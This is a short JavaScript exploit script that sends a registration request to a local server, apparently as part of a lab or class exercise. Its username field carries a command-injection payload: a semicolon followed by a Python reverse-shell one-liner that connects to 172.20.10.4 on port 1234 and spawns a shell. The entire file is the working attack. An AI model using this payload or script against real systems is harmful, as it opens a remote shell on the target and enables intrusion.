import axios from 'axios'

const payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.10.4",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

const sendRequest = async () => {
	const { data } = await axios.post('http://localserver.ucn:3003/register', {
		username: `test287; ${payload}`,
		email: 'test@mail.com',
		birth_date: '2024-01-01',
	})

	console.log(data)
}

sendRequest()
	.then(() => console.log('Script finalizado correctamente.'))
	.catch((err) => console.log(err))
